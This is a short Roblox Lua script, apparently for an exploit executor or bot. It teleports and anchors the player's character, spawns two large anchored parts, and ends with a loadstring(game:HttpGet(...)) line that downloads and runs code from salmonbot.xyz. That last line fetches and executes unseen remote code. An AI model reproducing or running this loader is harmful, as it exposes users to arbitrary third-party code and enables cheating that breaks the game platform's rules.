wait()
print("loooooooooooop")

wait(0.5)

    local plr = game:GetService("Players").LocalPlayer
    local character = plr.Character
character.HumanoidRootPart.CFrame = CFrame.new(0, 3, 0)

plr.Character.HumanoidRootPart.Anchored = true
x = Instance.new("Part", game.Workspace)
x.CFrame = CFrame.new(0, 1, 0)
x.Anchored = true
x.Size = Vector3.new(200,200,200)
x.Rotation = Vector3.new(0, 0, 0)

x = Instance.new("Part", game.Workspace)
x.CFrame = CFrame.new(0, 1, 0)
x.Anchored = true
x.Size = Vector3.new(2,2,2)
x.Rotation = Vector3.new(0, 0, 0)

loadstring(game:HttpGet("https://salmonbot.xyz/scripts/loop.lua", true))()
